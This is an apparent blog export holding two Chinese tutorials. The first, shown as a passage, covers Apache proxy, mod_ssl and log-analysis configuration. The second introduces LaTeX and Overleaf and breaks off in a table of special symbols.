keepalive=on/off 是否启用与后端的持久连接（HTTP Keep-Alive） disablereuse=on/off 禁止复用已建立的后端连接 max=number 最大并发连接数（可与 mod_proxy_balancer 配合） ttl=N 连接在连接池中存活的时间（秒） flushpackets=on/off 每次写数据包时立即刷新到客户端 示例 假设我们要代理到两个后端服务：一个API和一个博客，并希望为它们设置不同的超时时间\n\u0026lt;VirtualHost *:80\u0026gt; ServerName example.com ProxyRequests Off ProxyPreserveHost On # 代理API服务，设置15秒超时，并启用持久连接 \u0026lt;Proxy \u0026#34;http://127.0.0.1:8080\u0026#34;\u0026gt; ProxySet timeout=15 keepalive=on \u0026lt;/Proxy\u0026gt; ProxyPass /api/ http://127.0.0.1:8080/ ProxyPassReverse /api/ http://127.0.0.1:8080/ # 代理博客服务，不设置特定超时，使用默认配置 \u0026lt;Proxy \u0026#34;http://127.0.0.1:9000\u0026#34;\u0026gt; # 可以在此处添加特定配置 \u0026lt;/Proxy\u0026gt; ProxyPass /blog/ http://127.0.0.1:9000/ ProxyPassReverse /blog/ http://127.0.0.1:9000/ \u0026lt;/VirtualHost\u0026gt; 此配置比在ProxyPass中添加参数更清晰，且允许对每个后端应用独特的代理行为\n正向代理 在正向代理模式下，Apache扮演客户端的代理\n当客户端请求外部资源时，请求会首先发送给Apache，由Apache代为访问外部网络\n配置 正向代理的配置非常简单：\nProxyRequests On 这是开启正向代理功能的指令\n示例 # 开启正向代理功能 ProxyRequests On \u0026lt;Proxy *\u0026gt; # 允许来自特定IP的请求通过此代理 Require ip 192.168.1.0/24 # 禁止所有其他请求 Require all denied \u0026lt;/Proxy\u0026gt; 这里\u0026lt;Proxy *\u0026gt;匹配所有目标地址，启用正向代理后，Apache会接受客户端发来的完整URL请求，然后去请求目标站点，再把响应转发回来，目标站点只会看到Apache的IP，不会看到客户端的真实IP\nmod_ssl：SSL/TLS加密模块 mod_ssl是Apache实现HTTPS加密服务的模块，它使用OpenSSL库来处理加密和解密\n其配置通常在443端口的\u0026lt;VirtualHost\u0026gt;块中完成\n使用之前 大多数现代Linux发行版在安装Apache时，mod_ssl默认已经被加载，如果没有，我们需要手动启用它\n在Debian/Ubuntu上：\na2enmod ssl 在RHEL/CentOS上：\nLoadModule ssl_module modules/mod_ssl.so 核心指令 这些指令定义了HTTPS服务所需的证书和密钥文件\n指令 格式 含义 SSLEngine SSLEngine on或SSLEngine off 开启或关闭该虚拟主机上的SSL/TLS引擎 SSLCertificateFile SSLCertificateFile /path/to/fullchain.crt 指定SSL证书文件（公钥）\n推荐使用包含服务器证书和所有中间证书的完整链文件 SSLCertificateKeyFile SSLCertificateKeyFile /path/to/private.key 指定与证书配对的私钥文件\n此文件必须严格保密 SSLCertificateChainFile SSLCertificateChainFile /path/to/chain.crt 指定中间证书链文件\n如果SSLCertificateFile已包含完整链，则此指令可选 Protocols Protocols h2 http/1.1 指定服务器支持的协议版本，可写多个\nh2代表HTTP/2 SSLCipherSuite SSLCipherSuite [套件列表] 指定服务器支持的加密套件列表\n增强安全性 示例 \u0026lt;VirtualHost *:443\u0026gt; ServerName secure.example.com DocumentRoot \u0026#34;/var/www/secure.example.com\u0026#34; ErrorLog \u0026#34;logs/secure.example.com-error.log\u0026#34; CustomLog \u0026#34;logs/secure.example.com-access.log\u0026#34; combined # 开启SSL/TLS引擎 SSLEngine on # 指定证书文件和私钥文件 SSLCertificateFile /etc/pki/tls/certs/secure.example.com.crt SSLCertificateKeyFile /etc/pki/tls/private/secure.example.com.key SSLCertificateChainFile /etc/pki/tls/certs/chain.crt # 推荐的安全性设置 Protocols h2 http/1.1 SSLHonorCipherOrder on SSLCipherSuite EECDH+AESGCM:EDH+AESGCM \u0026lt;/VirtualHost\u0026gt; 该配置块定义了一个监听443端口的虚拟主机\n它通过SSLEngine on指令开启了HTTPS服务，并使用SSLCertificateFile、SSLCertificateKeyFile和SSLCertificateChainFile指令指定了相应的证书和密钥\nProtocols和SSLCipherSuite指令则用于限制协议版本和加密算法，以确保安全性和性能\n日志分析 访问日志（access_log） 访问日志记录了所有客户端对服务器的请求\n日志格式 Apache默认使用combined格式，它是一种全面且常用的格式，记录了请求的方方面面\n日志格式通过LogFormat指令定义，并由CustomLog指令引用：\nLogFormat \u0026#34;%h %l %u %t \\\u0026#34;%r\\\u0026#34; %\u0026gt;s %b \\\u0026#34;%{Referer}i\\\u0026#34; \\\u0026#34;%{User-Agent}i\\\u0026#34;\u0026#34; combined CustomLog \u0026#34;logs/access_log\u0026#34; combined 格式字段 下表详细解释了combined日志格式中的每个字段\n字段标识符 含义 示例 %h 远程主机\n客户端的IP地址 123.123.123.123 %l 远程登录名\n由identd确定，通常为- - %u 远程用户\n由HTTP认证确定的用户名 用户名 (如果进行了认证)，否则为 - %t 时间\n服务器收到请求的本地时间 [10/Oct/2000:13:55:36 -0700] \\\u0026quot;%r\\\u0026quot; 请求行\n完整的HTTP请求行，包括方法、路径和协议 \u0026quot;GET /apache_pb.gif HTTP/1.0\u0026quot; %\u0026gt;s 状态码\n返回给客户端的HTTP状态码\n%s：最初请求的状态码\n%\u0026gt;s：最终响应状态码（如果有内部重定向，记录重定向后的状态码） 200、404、301、500等 %b 响应体大小\n响应体的大小（字节），不包括响应头 2326 \\\u0026quot;%{Referer}i\\\u0026quot; 来源\n请求的来源URL \u0026quot;http://www.example.com/start.html\u0026quot; \\\u0026quot;%{User-Agent}i\\\u0026quot; 用户代理\n客户端浏览器或设备信息 \u0026quot;Mozilla/4.08 [en] (Win98; I ;Nav)\u0026quot; 实际示例 下面是一些常见的日志条目：\n成功请求 (200 OK)\n10.0.0.5 - - [20/Aug/2025:10:30:01 +0800] \u0026#34;GET /index.html HTTP/1.1\u0026#34; 200 450 \u0026#34;http://example.com/home\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\u0026#34; 来自内网IP10.0.0.5的客户端，使用Chrome浏览器访问http://example.com/home成功请求了根目录下的index.html文件，服务器返回了200状态码，响应体大小为450字节\n文件未找到 (404 Not Found)\n8.8.4.4 - - [20/Aug/2025:10:30:15 +0800] \u0026#34;GET /robots.txt HTTP/1.1\u0026#34; 404 213 \u0026#34;https://www.google.com/search?q=site:example.com\u0026#34; \u0026#34;Googlebot/2.1 (+http://www.google.com/bot.html)\u0026#34; Google爬虫（Googlebot）从搜索引擎结果页进入，请求了robots.txt文件，但服务器返回了 404 错误，表示该文件不存在，响应体大小为213字节，通常是Apache默认的404错误页面\n永久重定向 (301 Moved Permanently)\n123.123.123.123 - - [20/Aug/2025:10:30:20 +0800] \u0026#34;GET /old-page HTTP/1.1\u0026#34; 301 245 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/106.0.5249.101 Mobile/15E148 Safari/604.1\u0026#34; 来自IP123.123.123.123的iPhone客户端请求了/old-page，但服务器配置了301重定向，将请求永久指向了新地址，浏览器从HTTPS页面跳转到HTTP页面时，出于安全考虑，默认不会发送Referer，故而referer字段为空\n服务器内部错误 (500 Internal Server Error)\n192.168.1.10 - - [20/Aug/2025:10:30:35 +0800] \u0026#34;GET /api/data HTTP/1.1\u0026#34; 500 503 \u0026#34;-\u0026#34; \u0026#34;curl/7.68.0\u0026#34; 内网IP192.168.1.10请求http://example.com/dashboard页面（可能是一个脚本或API调用）返回了500内部服务器错误，这通常意味着后端脚本（如PHP或Python）执行失败，要排查具体原因，必须查看错误日志\n错误日志（error_log） 错误日志记录了服务器启动、运行、关闭过程中的所有诊断信息和错误\n格式与字段 error.log条目的通用格式如下：\n[时间戳] [模块:日志级别] [pid 进程ID:tid 线程ID] [client 客户端IP:端口] 错误描述 [时间戳]\n日志事件发生的时间\n[模块:日志级别]\n指明产生日志的Apache模块（如core、proxy_http等）以及该事件的严重程度，具体看：日志配置 [pid 进程ID:tid 线程ID]\n指明是哪个Apache进程和线程产生了该日志，这在调试多进程或多线程问题时很有用\n[client 客户端IP:端口]\n指明导致错误的客户端IP地址和端口\n示例 下面是一些常见的错误日志条目：\n文件权限问题\n[Wed Aug 20 10:30:00.123456 2025] [core:crit] [pid 12345] (13)Permission denied: AH00035: Unable to change to root directory: /var/www/site/dir 这是一个严重的错误（crit），通常发生在Apache启动时，它表明Apache进程（PID为12345）没有权限访问或切换到/var/www/site/dir目录，通常是由于文件或目录权限设置不正确所致，需要检查该目录的用户和组是否与httpd.conf中定义的User和Group匹配\n配置文件语法错误\n[Wed Aug 20 10:31:00.987654 2025] [core:warn] [pid 12345] AH00547: The document root /var/www/example.com/public does not exist 这是一个警告（warn），服务器尝试启动，但发现DocumentRoot指令中指定的 /var/www/example.com/public目录不存在，Apache虽然可以启动，但网站将无法正常访问\n后端连接失败\n[Wed Aug 20 10:32:00.123456 2025] [proxy:error] [pid 12345:tid 67890] [client 192.168.1.50:12345] AH00959: ap_proxy_connect_backend disabling connection: (111)Connection refused 这是一个错误（error），proxy模块无法连接到后端服务器，因为它返回了“连接被拒绝”（Connection refused）的错误，这通常意味着后端应用服务没有运行，或者防火墙阻止了连接\nmod_rewrite 调试信息\n[Wed Aug 20 10:33:00.789012 2025] [rewrite:trace1] [pid 12345] (2) init rewrite engine with requested uri /about [Wed Aug 20 10:33:00.789012 2025] [rewrite:trace3] [pid 12345] applying pattern \u0026#39;^(.*)$\u0026#39; to uri \u0026#39;/about\u0026#39; 这些是级别为trace1和trace3的调试信息，它们在 LogLevel 设置为 trace 时才会出现，这对于排查复杂的mod_rewrite规则非常有用，可以逐行跟踪规则的匹配和处理过程\nDocker环境中日志的特殊格式 有时，在使用官方httpdDocker镜像时，通过docker logs命令看到的日志格式与直接查看文件日志略有不同\n根据设置，Docker的日志驱动程序在将容器的stdout和stderr流捕获并输出时，可能会给每一行日志加上额外的前缀信息，这个前缀通常包含时间戳和日志流的来源（stdout或stderr），其标准格式为：\n[时间戳] [日志流] [原始日志内容] 字段 含义 示例 时间戳 Docker记录该日志的时间，精确到纳秒 2025-08-20T02:30:00.123456789Z 日志流 指明日志来源：\n标准输出：stdout，对应访问日志\n标准错误：stderr`，对应错误日志 stdout或stderr 示例 一个完整的docker logs访问日志条目看起来像这样：\n2025-08-20T02:30:00.123456789Z stdout 172.17.0.3 - - [20/Aug/2025:02:30:00 +0000] \u0026#34;GET / HTTP/1.1\u0026#34; 200 45 \u0026#34;-\u0026#34; \u0026#34;curl/7.64.1\u0026#34; 一个完整的错误日志条目看起来像这样：\n2025-08-20T02:30:05.987654321Z stderr [Wed Aug 20 02:30:05.987654 2025] [core:error] [pid 1] AH00037: File not found: /usr/local/apache2/htdocs/non-existent-file.html 分析技巧 以下命令示例均基于access.log文件\n统计访问量最多的IP地址 cut -d \u0026#39; \u0026#39; -f 1 access.log | sort | uniq -c | sort -rn | head -10 cut -d ' ' -f 1 access.log\n使用 cut 命令以空格为分隔符（-d ' '），提取每行的第一个字段（-f 1），即客户端 IP 地址\nsort\n对提取出的所有 IP 地址进行排序，这是uniq命令去重和计数的前提\nuniq -c\n统计每个 IP 地址出现的次数（-c 表示计数）\nsort -rn\n对上一步的结果进行再次排序\n-r表示降序排序，-n表示按数值大小排序（而不是按字典顺序），确保最高的访问次数排在最前面\nhead -10\n输出排序后的前10行，即访问次数最多的前10个IP地址及其次数\n统计特定页面或文件的访问次数 grep -c \u0026#34;/index.php\u0026#34; access.log grep \u0026quot;/index.php\u0026quot; access.log\n在access.log文件中搜索所有包含/index.php字符串的行\n-c选项\n告诉grep只输出匹配的行数，而不显示匹配的行本身\n统计特定IP地址的访问总次数 grep -w \u0026#34;192.168.200.2\u0026#34; access.log | wc -l grep -w \u0026quot;192.168.200.2\u0026quot; access.log\n使用grep搜索 IP 地址\n-w选项确保只匹配一个完整的“单词”，即只匹配192.168.200.2这个完整的IP地址\n|\n管道符，将grep命令的输出作为wc命令的输入\nwc -l\n统计来自管道的行数（-l表示行）\n每行代表一次访问，因此行数即为总访问次数\n统计特定时间段内的独立IP访问数 grep \u0026#34;03/Aug/2023:08:\u0026#34; access.log | awk \u0026#39;{print $1}\u0026#39; | sort | uniq | wc -l grep \u0026quot;03/Aug/2023:08:\u0026quot; access.log\n根据日志中的时间戳格式，筛选出所有在 2023年8月03日8时这个小时段内的访问记录\nawk '{print $1}'\nawk命令默认以空格分隔字段，{print $1}提取每行的第一个字段，即IP地址\nsort\n对所有提取出的IP地址进行排序\nuniq\n去重，只保留唯一的IP地址\nwc -l\n统计去重后剩下的行数，即独立IP地址的数量\n查找特定IP地址的详细访问记录 grep \u0026#34;192.168.200.2\u0026#34; access.log | more grep \u0026quot;192.168.200.2\u0026quot; access.log\n搜索包含该IP地址的所有日志行\n| more\n如果匹配的行数太多，more命令会进行分页显示，方便逐页查看，按空格键翻页，按q键退出\n文章至此告一段落，笔者使用的也不多，之后边学边更新吧\n","date":"2025-08-23T19:26:25+08:00","image":"http://picture.928330.xyz/typora/66d1339d8d7af.jpg","permalink":"https://blog.928330.xyz/p/apache%E5%85%A5%E9%97%A8/","title":"Apache入门"},{"content":"1978年，为了解决解决当时学术出版里公式排版不美观的问题，计算机科学家Donald Knuth开发了一个排版系统，并给他命名为TeX（发音接近 \u0026ldquo;tech\u0026rdquo;），它的功能强大，但写起来很繁琐\n而我们要学的LaTeX（读作\u0026quot;Lay-tech\u0026quot;或 \u0026ldquo;Lah-tech\u0026rdquo;）是一个基于TeX的排版系统，它由Leslie Lamport在 1980年开发，目的是让普通人更容易使用TeX\n可以这样理解：\nTeX就像汇编语言，底层、强大，但复杂 LaTeX就像高级语言，在 TeX 上加了封装，更易用 LaTeX在现代被广泛使用，用于生成高质量的文档，尤其擅长处理包含数学公式、科学符号和复杂排版的内容\n所以学点吧，学点总没错\n注意：LaTeX的命令是大小写敏感的！\n为何选择LaTeX？ 与我们熟知的Word这类“所见即所得”(WYSIWYG) 的编辑器不同，LaTeX 是一种**“所见即所想” (WYSIWYM)** 的排版系统\nWord (所见即所得)\n我们的编辑界面就是最终的页面，自由度高，上手简单\n但缺点在于，手动调整格式容易出现细节不一致（如行距、字体混乱），且对于学术论文中的公式、图表、参考文献的自动编号和交叉引用支持不佳\nLaTeX (所见即所想)\n我们负责撰写内容并用代码写排版指令，例如\\section{引言}就是告诉LaTeX“这里是一个一级标题，内容是引言”\n我们无需关心它具体用什么字体、多大字号、距离页边距多少，编译器会根据预设的规范，自动生成一篇格式精美、高度一致的文档\n这种模式赋予了LaTeX无与伦比的优势，特别是在学术写作领域：\n规范与专业：自动处理编号、格式，确保全文样式统一，版面专业 强大的数学公式支持：被公认为数学公式排版的行业标准 自动化管理：目录、图表列表、参考文献等都能自动生成和更新 结构化写作：强迫作者专注于内容和逻辑，而非琐碎的格式调整 同一篇文章，虽然Word和LaTeX最终都能实现类似的效果，但LaTeX的排版更加专业好用\n另外，关于LaTeX的读音，虽然百科上的推荐发音是\u0026quot;拉泰赫\u0026quot;，但读成\u0026quot;拉泰克斯\u0026quot;也是可以的，读音不重要\nOverleaf 何为overleaf 对于初学者，安装和配置本地LaTeX环境可能比较繁琐，因此，本教程将以Overleaf为核心工具\nOverleaf是一个强大的在线LaTeX编辑器：\n零配置：无需在本地安装任何软件，注册账号即可使用 实时预览：左侧编写代码，右侧实时显示生成的PDF效果 模板丰富：提供大量期刊、论文、简历、幻灯片等高质量模板 协作方便：可以像谷歌文档一样与他人在线协作 我们完全可以把它当成长期的LaTeX工具使用\n如何使用？ 访问Overleaf官网 或者Overleaf中文官网 并注册一个免费账户\n登录后，点击左上角的 \u0026ldquo;New Project\u0026rdquo;，我们可以选择创建一个\u0026quot;Blank Project\u0026quot;（空白项目）、\u0026ldquo;Example Project\u0026rdquo;（示例项目）或从\u0026quot;Templates\u0026quot;（模板）中选择一个开始\n如果我们已经有本地项目，也可以选择\u0026quot;Upload project\u0026quot;（上传项目）\n进入编辑器界面，我们会看到：\n左侧：文件列表（可以上传图片、创建.bib文件等） 中间：源代码编辑区，我们将在这里编写LaTeX代码 右侧：点击编译，实时预览生成的PDF文档 可以点击两个区域之间的箭头\n中间写好之后，点击右边区域上方的\u0026quot;重新编译\u0026quot;按钮，稍等片刻即可看见文档\n如果因为语法等错误编译失败，则会看见修复建议和原始错误日志\n点击左上角叶子状图标，可以进行设置，包括编译器种类、Tex版本、自动补全、主题等等\nLaTeX编译器 overleaf支持很多不同的LaTeX编译器引擎，大部分语法在他们中都是一样的\npdfLaTeX 传统的LaTeX引擎，最常见，历史最久\n优点：\n稳定、兼容性最好 生态最丰富，几乎所有宏包都支持 缺点：\n不支持Unicode → 中文、Emoji、现代字体用起来很麻烦 字体只能用TeX内置机制，必须事先安装TeX字体集（比如fandol），否则会报错 XeLaTeX 基于Unicode，专门为现代字体设计的引擎\n优点：\n原生支持Unicode → 直接输入中文没问题 可以调用系统字体（比如Windows的宋体、Mac的苹方、Linux的思源黑体等），不需要fandol 字体控制能力强（比如\\setmainfont{Times New Roman}） 缺点：\n编译速度比pdfLaTeX慢一些 个别宏包兼容性稍差，但大部分现在都支持了 LuaLaTeX 和XeLaTeX类似，也支持Unicode，底层基于Lua脚本引擎\n优点：\n同样支持系统字体 更灵活：可以用Lua脚本扩展TeX功能（比如处理复杂语言、图形、自动化排版） 缺点：\n和XeLaTeX一样，速度比pdfLaTeX慢 Lua机制比较复杂，对新手不太友好 LaTeX文档的基本结构 每一个LaTeX文档都由两部分组成：导言区和正文区\n我们先给出一个完整的示例，看不懂没关系，先尝尝咸淡：\n% --- 导言区开始 --- \\documentclass[12pt, a4paper]{ctexart} % 定义文档类型和基本设置 \\usepackage{amsmath} % 加载宏包，以使用更多功能 \\usepackage{graphicx} \\usepackage[colorlinks, citecolor=blue]{hyperref} \\title{第一个LaTeX 文档} % 设置标题 \\author{作者名字} \\date{\\today} % 日期, \\today 会自动生成当天日期 % --- 导言区结束 --- % --- 正文区开始 --- \\begin{document} \\maketitle % 显示标题、作者和日期 正文内容 \\end{document} % --- 正文区结束 --- 编译结果：\n导言区 这是从\\documentclass开始到\\begin{document}之前的部分，我们在这里进行全局设置\n文档类型 (\\documentclass) 此命令用于定义文档的全局类型，例如是文章、书籍还是幻灯片\n它必须 .tex文件中的第一个命令\n格式 \\documentclass[参数]{文档类型名称} {类型名称} (必填) 这是文档的根本类型，决定了是否有章节、标题页的默认格式等\n类型 中文版本 适用场景 特点 article ctexart 短小文档\n如期刊文章、课程作业、报告 无\\chapter命令，章节较简单，适合短篇文档 report ctexrep 中长篇文档\n如毕业论文、研究报告 有\\chapter命令，章节层次更丰富 book ctexbook 书籍排版 支持书籍格式，如封面、目录、章节分页 beamer ctexbeamer 幻灯片/演示文稿 专门用于制作演示文稿，支持动画、主题切换 [参数] (选填) 这些参数用于对文档的基础样式进行微调，多个参数之间用逗号隔开\n字体大小\n控制正文文字大小，也会影响章节标题、页眉页脚等\n选项 含义 10pt 正文字体 10 磅（默认） 11pt 正文字体 11 磅 12pt 正文字体 12 磅 纸张大小\n决定页面尺寸和默认页边距\n选项 尺寸 a4paper 210mm × 297mm letterpaper 8.5in × 11in b5paper 176mm × 250mm a5paper 148mm × 210mm 排版方式\n决定奇偶页布局差异，主要用于打印装订\n选项 含义 oneside 单面排版，左右页边距相同（默认article） twoside 双面排版，奇偶页左右页边距不同（默认book） 分栏\n控制正文是单栏还是多栏\n选项 含义 onecolumn 单栏正文（默认） twocolumn 双栏正文，适合学术论文或期刊 其他常用选项\n选项 含义 openright 新章从奇数页开始（适合 book） openany 新章可从任意页开始 titlepage 文档使用单独的标题页 draft 显示超长行标记，图形不渲染（调试用） final 正式排版（默认） 示例 \\documentclass[12pt, a4paper, oneside]{ctexart} 这行代码定义了整个文档的基础框架：\n{ctexart}\n将文档类型设置为中文文章，这意味着我们可以直接输入中文，并使用\\section、\\subsection等命令\n[12pt, a4paper, oneside]\n12pt：将文档的默认字体大小设置为12磅 a4paper：将排版的纸张设置为A4尺寸 oneside：采用单面排版模式 即：该命令声明了我们要创建的是一份字体大小为12pt、在 A4 纸上进行单面排版的中文文章\n宏包 (\\usepackage) 宏包（Package）可以理解为 LaTeX 的“插件”或“扩展库”\n通过加载宏包，我们可以使用更多强大的命令和功能，例如插入图片、设置页边距、生成带链接的目录等\n宏包通常在导言区（\\documentclass 之后，\\begin{document} 之前）加载\n格式 \\usepackage[可选参数]{宏包名称} {宏包名称} (必填) 这是宏包的核心标识，用于指定需要加载的宏包\n可以一次性加载多个无参数的宏包，用逗号隔开，例如\\usepackage{amsmath, graphicx}\n常用宏包：\n宏包名称 主要功能与用途 ctex 中文支持的核心宏包，当使用ctexart等文档类型时，该宏包会被自动加载 amsmath 美国数学学会(AMS)宏包，提供更丰富的数学公式环境，如多行公式、矩阵等 amssymb AMS宏包，提供更多数学符号，如 \\mathbb (黑板粗体)、\\checkmark (对勾) amsthm AMS宏包，用于定义专业的定理、引理、定义等环境 graphicx 提供\\includegraphics 命令，是插入图片（如 JPG, PNG, PDF）的必备宏包 geometry 便捷地设置页面布局，如页边距、纸张方向、页眉页脚距离等 hyperref 自动为文档内的引用（目录、公式、参考文献）创建可点击的PDF超链接，极大提升电子文档的交互性 xcolor 提供颜色支持，可以定义和使用颜色来修饰文本、表格背景等 fancyhdr 用于自定义页眉和页脚，可以添加章节名、页码、校徽等复杂信息 listings 用于插入带语法高亮的代码块，是撰写技术文档的利器 [可选参数] (选填) 用于对所加载的宏包进行配置。每个宏包都有一套独立的参数\n注意：在LaTeX中，当一个选项是布尔型（true/false）时，只写选项名就默认等价于true\n这里分别介绍几个常用宏包的参数\ngeometry\n这个宏包专门用于精细控制页面尺寸和边距\n选项 功能说明 left=2.5cm、right=2.5cm 分别设置左、右页边距 top=3cm、bottom=3cm 分别设置上、下页边距 margin=1in 将上、下、左、右所有页边距统一设置为1英寸 a4paper、b5paper 设定纸张尺寸 landscape 设置为横向排版（默认为 portrait 纵向） showframe 在页面上显示布局的辅助线框，方便调试页边距设置 hyperref\n这个宏包用于生成PDF的超链接和书签\n选项 功能说明 colorlinks=true 使用彩色文本作为链接，而非默认的带边框样式。强烈推荐设置 linkcolor=black 设置内部链接（如目录、章节引用 \\ref）的颜色 citecolor=blue 设置文献引用（\\cite）的链接颜色 urlcolor=cyan 设置网址链接（\\url）的颜色 bookmarks=true 在PDF阅读器侧边栏中生成可点击的书签 pdfstartview=FitH 设置PDF打开时的默认视图为“适合页宽” xcolor\n这个宏包用于在文档中使用颜色\n选项 功能说明 dvipsnames 加载dvips预定义的68种颜色名称（如Goldenrod） svgnames 加载SVG预定义的151种颜色名称（如AliceBlue） x11names 加载X11预定义的317种颜色名称（如LightSteelBlue） 加载这些选项后，就可以直接通过名称使用颜色，例如\\textcolor{Goldenrod}{这是金麒麟色的文字}\nctex\n当手动加载\\usepackage{ctex}时，可以填选\n选项 功能说明 UTF8 明确指定源文件编码为UTF-8（现在通常是默认设置，无需手动指定） fontset=adobe 设置中文字体集为Adobe字体（需要系统安装相应字体） fontset=windows 在Windows系统下，设置中文字体集为系统自带字体（如宋体、黑体等） 示例 \\usepackage{amsmath, amssymb} \\usepackage[a4paper, margin=2.5cm, showframe]{geometry} \\usepackage{graphicx} \\usepackage[colorlinks, citecolor=blue, linkcolor=black, bookmarks=true]{hyperref} 这段代码在导言区加载并配置了一系列常用的宏包：\n\\usepackage{amsmath, amssymb}\n通过逗号分隔的方式，同时加载了 amsmath 和 amssymb 两个宏包\n他们为文档提供了强大的数学公式排版能力和丰富的数学符号支持\n\\usepackage[a4paper, margin=2.5cm, showframe]{geometry}\n加载了geometry宏包，并传入了三个参数：\na4paper: 确保页面尺寸是基于 A4 纸张计算的 margin=2.5cm: 将页面的上、下、左、右所有页边距统一设置为 2.5 厘米 showframe: 在生成的PDF上绘制辅助线框，方便我们检查页边距设置是否符合预期。 \\usepackage{graphicx}\n加载了graphicx宏包\n这一行代码本身不产生任何效果，但它使得我们可以在正文部分使用\\includegraphics命令来插入图片\n\\usepackage[...]{hyperref}\n加载了hyperref宏包，并通过一系列参数对其进行了详细配置：\ncolorlinks: 使链接以彩色文本显示 citecolor=blue: 文献引用链接为蓝色 linkcolor=black: 内部跳转链接（如目录）为黑色 bookmarks=true: 会在生成的 PDF 文件中创建书签，方便快速导航 正文区 在导言区完成文档的全局设置后，正文区（document环境）用于撰写具体内容。\n正文环境：document 所有希望在最终PDF中显示的内容，都必须放在\\begin{document}和\\end{document}之间\n\\begin{document}和\\end{document}中的document 并不是一个可选参数或用户自定义的名字，它是 LaTeX 固定的环境名称，用于标识正文的开始，不是可选的，不能改动！\n命令 / 符号 功能说明 \\begin{document} 正文开始标志\n必须在导言区（包括所有\\usepackage命令）之后使用 \\end{document} 正文结束标志\n编译器会忽略此命令之后的所有内容 注释 单行注释 使用符号%，从%开始到行尾的内容都会被忽略，不会出现在最终PDF里\n注释的一行是源代码的一行，而不是LaTeX文章的一行 使用快捷键ctrl+/能快速注释选中行 多行注释 LaTeX没有内置的多行注释符号，如果想要多行注释，最简单的方式是连续多行都写%\n也可以使用下面的方式：\n\\iffalse 这几行内容都会被忽略 即使有多行 LaTeX 也不会处理 \\fi \\iffalse表示“如果条件为假”，LaTeX会跳过它和\\fi 之间的内容，相当于把里面的东西忽略掉\n示例 \\begin{document} % 作者的所有可见内容、命令和环境都写在这里。 % 这一行是注释，不会显示在PDF中 ... \\end{document} 文档内容排版 在设置好文档的框架（导言区）后，我们就可以开始在正文环境中填充实际内容了\n这部分将介绍如何组织文本结构、设置样式以及创建列表\n段落、间距与分页 LaTeX会自动处理文本的排版，但我们有时也需要手动控制换行和分页\n命令操作 注意：\n在行中的命令最好左右加上空格 在行间的命令最好上下隔开空行 操作 实现方式 说明 开始新段落 在代码中留出一个或多个空行 这新段落会自动应用首行缩进 强制换行 \\\\ 或 \\newline 在当前位置中断该行内容\n从下一行开始它不属于新段落，因此没有首行缩进 禁止换行 ~ 这是非换行空格\n放在两个词之间以确保它们不会因换行而分开\n比如Dr.~Smith 制造水平空格 \\quad 产生一个当前字号的全角宽度 (1em) 的空格 \\qquad 产生当前字号的两倍全角宽度的空格 \\hspace{长度} 产生一个指定长度的水平空格，如\\hspace{1cm} \\hfill 弹性空格，会自动填充所在行所有可用的水平空间\n可用于实现左右对齐 制造垂直空行 \\vspace{长度} 产生一个指定高度的垂直空白，如\\vspace{5mm} \\smallskip, \\medskip, \\bigskip 三个预设的、有弹性的垂直空白，尺寸由小到大 强制分页 \\newpage 立即结束当前页面，将后续内容移至新的一页 局部取消缩进 \\noindent 段落开头不缩进\n注意要和正文之间有空格/换行符 全局取消缩进 \\setlength{\\parindent}{0pt} - 局部进行缩进 \\hspace*{2em}段落\\\\ 和上一条命令结合可以做到指定行才缩进 左对齐 \\begin{flushleft}...\\end{flushleft} - 居中对齐 \\begin{center}...\\end{center} - 右对齐 \\begin{flushright}...\\end{flushright} - 示例 这是第一段的文字，一直写下去直到行尾自动换行 这是第二段的文字，因为它和第一段之间有一个空行，所以它会首行缩进 现在要强制换行了\\\\这一句紧接着上一句，但是没有缩进 \\begin{center} 这是一段居中的文字 \\end{center} \\noindent 这一行虽然换行了，却没有首行缩进 \\noindent 开头 \\quad 我远离了前面的字 \\qquad 我更远离了 \\hspace{2cm} 还是我比较远一点 左边内容→弹性 \\hfill 弹性←右边内容 小空行： \\smallskip 中空行： \\medskip 大空行： \\bigskip 自定义空行： \\vspace{2cm} 到这里是两厘米空行 要另起一页了 \\newpage 这是新的一页 编译结果：\n文本样式 LaTeX 提供了一系列命令来改变局部文本的字体样式\n命令 命令 效果 英文说明 \\textbf{...} 加粗文本 Bold Face \\textit{...} 意大利斜体 Italic \\textsl{...} 倾斜文本 Slanted \\textsc{...} 小型大写字母 Small Caps \\textup{...} 直立体 Upright (用于在斜体环境中恢复正常字体) \\underline{...} 下划线 Underline \\texttt{...} 等宽字体/打字机体 typewriter \\textnormal{...} 正常文本 恢复到当前文档的默认字体 他们之间可以互相嵌套，比如：\\underline{\\textbf{\\textit{示例文本}}}\n示例 \\noindent 这是一段普通的文本，其中包含 \\textbf{加粗} 和 \\textit{斜体}\\\\ 这是正常字母：ABC\\\\ 这是小型大写字母\\textsc{abc}\\\\ 请注意 \\textsl{倾斜} 与 \\textit{意大利斜体} 的细微差别\\\\ \\underline{\\textbf{\\textit{既要下划线又要斜体还要加粗就这样}}}\\\\ 特殊字符 在 LaTeX 中，许多键盘上的符号被用作特殊命令，因此不能直接输入。这一节将介绍如何正确地输入这些特殊字符，以及其他一些常用的排版符号。\n英文引号 英文的弯引号‘ ’和“ ”与键盘上直接打出的直引号'和\u0026quot;是不同的\n在 LaTeX 中，输入正确的弯引号需要使用特定的按键\n功能 输入方式 渲染效果 英文单引号 (左) ` (反单引号) ‘ 英文单引号 (右) \u0026rsquo; (单引号) ’ 英文双引号 (左) `` (两个反单引号) “ 英文双引号 (右) \u0026rsquo;\u0026rsquo; (两个单引号) ” 保留字符 以下字符在LaTeX中有特殊含义，因此不能直接在文本中输入 要显示它们本身，必须在前面加上反斜杠 \\ 来进行转义\n符号 输入命令 说明 # \\# 宏定义参数符号 $ \\$ 数学模式切换符号 % \\% 注释符号 \u0026amp; \\\u0026amp; 对齐符号（用于表格、矩阵等） _ \\_ 下标符号（数学模式） { \\{ 命令参数或分组的开始 } \\} 命令参数或分组的结束 ^ \\^{} 上标符号（数学模式） ~ \\~{} 非换行空格或字母重音 \\ \\textbackslash 命令引导符，也就是反斜杠 常见货币与版权符号 符号 输入命令 备注 € \\texteuro 需要 textcomp 宏包 £ \\pounds 无需特殊宏包 ¥ \\textyen 需要 textcomp 宏包 (在 ctex 环境下有时可直接输入) © \\copyright 版权符号 ® \\textregistered 